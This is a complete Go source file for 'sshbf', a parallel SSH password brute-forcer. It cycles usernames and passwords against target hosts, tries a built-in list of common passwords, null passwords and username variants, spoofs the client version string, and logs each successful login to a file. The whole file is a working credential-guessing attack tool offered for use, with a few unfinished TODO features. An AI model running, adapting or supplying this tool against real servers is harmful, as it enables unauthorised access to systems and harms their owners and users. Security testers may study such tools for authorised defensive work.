// sshbf is a simple SSH Brute-Forcer.

/*
 * sshbf.go
 * Simple SSH bruteforcer
 * by J. Stuart McMurray
 * created 20140717
 * last modified 20140717
 */

package main

import (
	"bufio"
	"code.google.com/p/go.crypto/ssh"
	"container/list"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
)

/* attempt contains all the data needed for an attepmt to guess a password */
type attempt struct {
	User    string
	Pass    string
	Host    string
	Config  *ssh.ClientConfig
	Removed bool /* Whether it's been removed from the list */
}

/* New makes a new attempt from a template with Pass and Config filled in, and
a version string of v. */
func (a attempt) New(p, v string) attempt {
	var n attempt
	n.User = a.User
	n.Host = a.Host
	n.Pass = p
	n.Config = &ssh.ClientConfig{
		User: n.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(n.Pass),
		},
		ClientVersion: v,
	}
	return n
}

/* Internal password list */
var IPL []string = []string{"admin", "password", "1234", "12345", "123456",
	"test", "oracle"}

/* Default connect timeout */
var deftimeout string = "10m"

func main() {

	/* Slice of username/password combinations */
	templates := list.New()
	alock := &sync.RWMutex{}

	/* Initial list of passwords to guess */
	initpw := []string{}

	var sf *os.File = nil

	/* Command-line arguments */
	userf := flag.String("user", "", "Single SSH username.  If neither "+
		"this nor -ufile is specified, root will be used.")
	passf := flag.String("pass", "", "Single SSH password.  If neither "+
		"this nor -pfile is specified, a small internal list of "+
		"passwords will be attempted.  See -plist.")
	hostf := flag.String("host", "", "Host to attack.  This is, of "+
		"course, required.  Examples: foo.bar.com, "+
		"foo.baaz.com:2222.  Either this or -hfile must be specified.")
	ufilef := flag.String("ufile", "", "File with a list of usernames, "+
		"one per line.  If neither this nor -user is specified, the "+
		"single username root will be used.  This list will be "+
		"read into memory, so it should be kept short on low-memory "+
		"systems.")
	pfilef := flag.String("pfile", "", "File with a list of passwords, "+
		"one per line.  If neither this nor -pass is specified, a "+
		"small internal list of passwords will be attempted.  See "+
		"-plist.")
	hfilef := flag.String("hfile", "", "File with a list of hosts to "+
		"attack, one per line.  Either this or -host must be "+
		"specified.  This list will be read into memory, so it "+
		"should be kept short on low-memory systems.")
	pnullf := flag.Bool("pnull", false, "Attempt the null (empty) "+
		"password as well as other specified passwords.")
	puserf := flag.Bool("puser", false, "Attempt the username as the "+
		"password as well as other specified passwords.")
	pbackf := flag.Bool("pback", false, "Attempt the username backwards "+
		"as the password as well as other specified passwords.  "+
		"E.g. root -> toor.")
	pdeflf := flag.Bool("pdefl", false, "Attempt the internal default "+
		"password list.")
	sshvsf := flag.String("sshvs", "SSH-2.0-sshbf_0.0.0", "SSH version "+
		"string to present to the server.")
	ntaskf := flag.Int("ntask", 4, "Number of attempts (tasks) to run in "+
		"parallel.")
	triesf := flag.Bool("tries", false, "Print every guess.")
	stdinf := flag.Bool("stdin", false, "Ignore most of the above and "+
		"read tab-separated username<tab>password<tab>host lines from "+
		"stdin.  NOT CURRENTLY IMPLEMENTED.")
	plistf := flag.Bool("plist", false, "Print the internal default "+
		"password list and exit.")
	deftimeoutd, err := time.ParseDuration(deftimeout)
	sfilef := flag.String("sfile", "", "Append successful "+
		"authentications to this file, which whill be flock()'d to "+
		"allow for multiple processes to write to it in parallel.")
	if err != nil {
		fmt.Printf("Invalid default wait duration.\n\n.")
		fmt.Printf("This is a bad bug.\n\n")
		fmt.Printf("You should tell the developers.\n")
		os.Exit(-6)
	}
	waitf := flag.Duration("wait", deftimeoutd, "Wait this long for "+
		"authentication to succeed or fail.")
	flag.Parse()

	/* If we're just printing the password list, do so and exit */
	if *plistf {
		fmt.Printf("Internal password list:\n")
		for _, p := range IPL {
			fmt.Printf("\t%v\n", p)
		}
		return
	}

	/* If we're to read from stdin, we can skip a lot of work */
	if *stdinf {
		log.Printf("Reading from stdin not currently implemented.\n")
		os.Exit(-1)
	} else {
		/* Work out the list of targets and usernames */
		targets, err := readLines(*hostf, *hfilef)
		if err != nil {
			log.Printf("Unable to read target hosts from %v: "+
				"%v.\n", *hfilef, err)
			os.Exit(-2)
		} else if len(targets) == 0 {
			log.Printf("Not enough target hosts specified.  " +
				"Please use -host and/or -hfile.\n")
			os.Exit(-4)
		}
		unames, err := readLines(*userf, *ufilef)
		if err != nil {
			log.Printf("Unable to read usernames from %v: %v.\n",
				*ufilef, err)
			os.Exit(-3)
		} else if len(unames) == 0 {
			log.Printf("Not enough usernames specified.  Please " +
				"use -user and/or -ufile.\n")
			os.Exit(-5)
		}

		/* Make sure the targets have ports */
		for i, t := range targets {
			if _, _, err := net.SplitHostPort(t); err != nil {
				targets[i] = net.JoinHostPort(t, "22")
			}
		}

		/* Make a list of passwordless ssh configs */
		for _, u := range unames {
			for _, t := range targets {
				templates.PushBack(attempt{User: u, Host: t,
					Removed: false})
			}
		}

		/* Work out a list of initial passwords */
		if *passf != "" { /* Password on command line */
			initpw = uniqueAppend(initpw, *passf)
		}
		if *pnullf { /* Use null password */
			initpw = uniqueAppend(initpw, "")
		}
		if *puserf { /* Username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, u)
			}
		}
		if *pbackf { /* Backwards username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, reverse(u))
			}
		}
		if *pdeflf { /* Internal default password list */
			for _, p := range IPL {
				initpw = uniqueAppend(initpw, p)
			}
		}
		if len(initpw) == 0 { /* If all else fails... */
			initpw = IPL
		}

	}

	/* TODO: Read username\tpassword\thost tuples from stdin */

	/* Channel through which to send tasking to tasks */
	attemptc := make(chan attempt)

	/* Channel through which to report successes */
	successc := make(chan attempt)

	/* Spawn off *ntaskf goroutines */
	donec := make(chan int) /* When tasks are done */
	for i := 0; i < *ntaskf; i++ {
		go sshTask(attemptc, successc, i, *triesf, donec, *waitf)
	}

	/* Generate username/password/host attempts */
	go attemptMaker(templates, initpw, *pfilef, attemptc, alock, *sshvsf)

	/* File to which to append successes */
	if *sfilef != "" {
		sf, err = os.OpenFile(*sfilef,
			os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
		if err != nil {
			fmt.Printf("Error opening success file %v: %v",
				*sfilef, err)
			os.Exit(-7)
		}
	}

	/* Exit after all the tasks have given up */
	for ndone := 0; ndone < *ntaskf; {
		select {
		case s := <-successc:
			log.Printf("SUCCESS: %v@%v %v", s.User, s.Host,
				textIfBlank(s.Pass))
			/* Log to the success file if we have one */
			if sf != nil {
				/* Try to get a lock */
				if err := syscall.Flock(int(sf.Fd()),
					syscall.LOCK_EX); err != nil {
					/* If not, log it */
					log.Printf("Not printing successful "+
						"password guess %v for %v@%v "+
						"due to error acquiring "+
						"exclusive lock on %v: %v",
						textIfBlank(s.Pass), s.User,
						s.Host, *sfilef, err)
				} else {
					/* If we got the lock, log the
					   password */
					fmt.Fprintf(sf, "%v@%v %v\n", s.User,
						s.Host, textIfBlank(s.Pass))
				}
                                /* In either case, (try to) unlock the file */
				syscall.Flock(int(sf.Fd()), syscall.LOCK_UN)
			}

			/* Remove template from list if we've got a password */
			alock.Lock()
			for e := templates.Front(); e != nil; e = e.Next() {
				if t, ok := e.Value.(attempt); ok &&
					t.User == s.User && t.Host == s.Host {
					templates.Remove(e)
				}
			}
			/* If we've no more guesses, we're done */
			if templates.Len() == 0 {
				return
			}
			alock.Unlock()
		case <-donec:
			ndone++
		}
	}
}

/* sshTask represents one parallelizable brute-forcer. attempts come in on
attemptc, and if a match is found, the userame, password, and host are sent
back on successc.  Tasknum is a unique identifier for this task. If triesf is
true, every attempt will to be printed. wait specifies how long each attepmt
will wait, with an upper bound specified opaquely by the ssh library. */
func sshTask(attemptc chan attempt, successc chan attempt, tasknum int,
	triesf bool, donec chan int, wait time.Duration) {
	for {
		/* Get a new attempt */
		a, ok := <-attemptc
		/* Die if the channel's closed */
		if !ok {
			donec <- 1
			return
		}
		/* TODO: Finish timeout in attempts */
		/* Print the attempt if requested */
		if triesf {
			/* Make sure the password works */
			log.Printf("[%v] Attempting %v@%v - %v", tasknum,
				a.User, a.Host, textIfBlank(a.Pass))
		}
		suc := make(chan bool, 1)
		/* Send data on a channel when we're done */
		go func() {
			/* Attempt to connect to server and authenticate*/
			if _, err := ssh.Dial("tcp", a.Host,
				a.Config); err == nil {
				suc <- true
			} else {
				suc <- false
			}
		}()
		/* Set timeout */
		select {
		case s := <-suc:
			if s {
				successc <- a
			}
		case <-time.After(wait):
			continue
		}
	}
}

/* attemptMaker spews out attempts on attemptc based on the username/host pairs
in templates, which will be read only after calling RLock on alock.  It will
first cycle through the passwords in initpw, then read lines of pwfile for the
passwords. cv is used as the SSH client version. */
func attemptMaker(templates *list.List, initpw []string, pwfile string,
	attemptc chan attempt, alock *sync.RWMutex, cv string) {

	/* For each password in initpw */
	for _, p := range initpw {
		if !broadcastPassword(p, templates, alock, attemptc, cv) {
			goto Done
		}
	}

	/* Open pwfile */
	if pwfile != "" {
		pf, err := os.Open(pwfile)
		/* Make pwfile iterable */
		if err != nil {
			log.Printf("Unable to open password file %v: %v",
				pwfile, err)
			goto Done
		}
		scanner := bufio.NewScanner(pf)
		/* For each password in pwfile */
		for scanner.Scan() {
			if !broadcastPassword(scanner.Text(), templates, alock,
				attemptc, cv) {
				goto Done
			}
		}
		/* Let the user know if there was an error reading pwfile */
		if err := scanner.Err(); err != nil {
			log.Printf("Error reading password file %v: %v",
				pwfile, err)
		}

	}
Done:
	/* If we're here, we're out of things to try. */
	log.Printf("Out of guesses.  Giving remaining attempts time to " +
		"complete.\n")
	close(attemptc)
	/* TODO: Notify user better and die better*/
	return
}

/* broadcastPassword sends a password out on attemptc, and listens on
remTemplate for templates to remove from templates.  alock will be Read-locked
before templates is read.  cv is used as the SSH client version.  Returns false
if templates is empty */
func broadcastPassword(password string, templates *list.List,
	alock *sync.RWMutex, attemptc chan attempt, cv string) bool {
	/* Current list element */
	alock.RLock()
	t := templates.Front()
	alock.RUnlock()
	/* Give up if there's no more templates */
	if t == nil {
		return false
	}
	/* Loop through entire list */
	for t != nil {
		/* Get a non-removed template */
		alock.RLock()
	NextT:
		if a, ok := t.Value.(attempt); ok && a.Removed {
			t = t.Next()
			goto NextT
		}
		alock.RUnlock()
		if t == nil {
			return true
		}
		/* Send forth the attempt */
		a, ok := t.Value.(attempt)
		if !ok {
			return false
		}
		attemptc <- a.New(password, cv)
		/* Get the next attempt ready */
		alock.RLock()
		t = t.Next()
		alock.RUnlock()
	}
	return true
}

func stdinAttemptMaker() {} /* TODO: Finish this */

/* Read lines from the file named file into a deduped, in-order slice,
optionally starting with leader if it is not the empty string.  It is not an
error if file is the empty string (in which case a slice containing only leader
will be returned), but it is an error if file cannot be read.  Windows line
endings may do strange things. */
func readLines(leader, file string) ([]string, error) {
	/* Initial collections */
	m := map[string]bool{}
	s := []string{}

	/* Add leader if it's not empty */
	if leader != "" {
		m[leader] = true
		s = append(s, leader)
	}

	/* Read from file if we have it */
	if file != "" {
		bytes, err := ioutil.ReadFile(file)
		if err != nil {
			return s, err
		}
		/* Remove single trailing newline (to prevent always having a
		   blank string */
		if bytes[len(bytes)-1] == '\n' {
			bytes = bytes[:len(bytes)-1]
		}
		/* Split the contents of the file into lines, append each
		   unique line */
		for _, h := range strings.Split(string(bytes), "\n") {
			/* Add the line if we don't already have it */
			if _, in := m[h]; !in {
				m[h] = true
				s = append(s, h)
			}
		}
	}
	return s, nil
}

/* reverse reverses a string */
func reverse(s string) string {
	// Get Unicode code points.
	n := 0
	rune := make([]rune, len(s))
	for _, r := range s {
		rune[n] = r
		n++
	}
	rune = rune[0:n]
	// Reverse
	for i := 0; i < n/2; i++ {
		rune[i], rune[n-1-i] = rune[n-1-i], rune[i]
	}
	// Convert back to UTF-8.
	return string(rune)
}

/* uniqueAppend appends a string to a slice only if the slice doesn't contain
the string.  Since it searches in O(n) time, it should only be used for
reasonably small slices */
func uniqueAppend(slice []string, s string) []string {
	/* Make sure s isn't in slice */
	for _, val := range slice {
		if val == s {
			return slice
		}
	}
	return append(slice, s)
}

/* textIfBlank returns "<blank>" if the input is "" */
func textIfBlank(s string) string {
	if s == "" {
		return "<blank>"
	}
	return s
}
